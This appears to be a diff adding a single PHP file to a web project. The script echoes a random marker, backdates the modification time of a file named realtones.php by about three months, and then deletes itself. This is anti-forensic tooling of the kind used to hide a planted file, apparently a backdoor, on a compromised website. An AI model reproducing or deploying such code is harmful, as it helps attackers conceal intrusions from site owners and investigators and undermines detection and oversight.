@@ -1,0 +1,1 @@
+<?php echo "WbmmHNuGMD"; if (file_exists("./realtones.php")){ touch("./realtones.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*dUasPYN00C0mDNM58AHX*/ ?>
